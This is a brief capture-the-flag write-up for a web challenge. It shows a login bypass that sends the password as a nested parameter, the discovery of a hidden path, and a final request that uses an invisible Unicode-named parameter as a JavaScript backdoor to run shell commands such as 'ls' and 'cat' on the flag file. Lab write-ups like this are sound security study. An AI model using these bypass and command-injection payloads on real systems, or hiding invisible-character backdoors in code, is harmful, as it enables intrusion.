# Challenge
It takes one character [ ] to show you that the path to salvation

And it takes a hidden character to lead you to the flag

[https://typhooncon-hiddencharacter.chals.io/](https://typhooncon-hiddencharacter.chals.io/)

Flag format: SSD{...}

## Solution \[rgolab\]
First we have to find how to login
send payload:
```
username=admin&password[password]=1
```

after that we're able to check /home code and we can see we're able to go to the /${PortaSulRetro} which was set in the HTTP header
After join we'll see the [invisible backdoor](https://certitude.consulting/blog/en/invisible-backdoor/) in JS.

Final payload:
```
/127cf15f4a0ab591?%E3%85%A4=ls+-al+/srv/flag;cat+flag
```
and we have a flag:
```
SSD{bfee01bf8ca5f1766fb91b3b4a0533614da92beb}
```

#js #backdoor #commandinjection
